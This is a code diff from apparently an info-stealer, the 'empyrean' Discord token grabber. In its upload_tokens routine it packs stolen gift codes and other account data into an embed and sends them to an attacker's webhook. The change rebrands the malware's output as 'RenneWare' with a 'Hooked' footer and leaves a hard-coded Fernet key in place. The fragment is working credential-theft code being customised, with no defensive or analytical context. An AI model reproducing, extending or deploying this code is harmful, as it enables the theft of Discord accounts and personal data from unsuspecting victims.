@@ -367,8 +367,8 @@ class upload_tokens:
                 embed.add_field(name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
-            embed.set_footer(text="github.com/addi00000/empyrean")
+            embed.set_footer(text="Hooked")
 
-            self.webhook.send(embed=embed, username="REBEL", avatar_url="https://media.discordapp.net/attachments/1070581776537374721/1080930552967860315/static.png")
+            self.webhook.send(embed=embed, username="RenneWare", avatar_url="https://media.discordapp.net/attachments/1070581776537374721/1080930552967860315/static.png")
 class c:
     y="dTFLb2ZnT2ZCX2RxdmlqR0tlT1R1MWM3QnJ1anBSQ1JFeVhUbkVjRmctUT0=" # Generate Fernet Key and encrypt Result in Base64 and place in String.
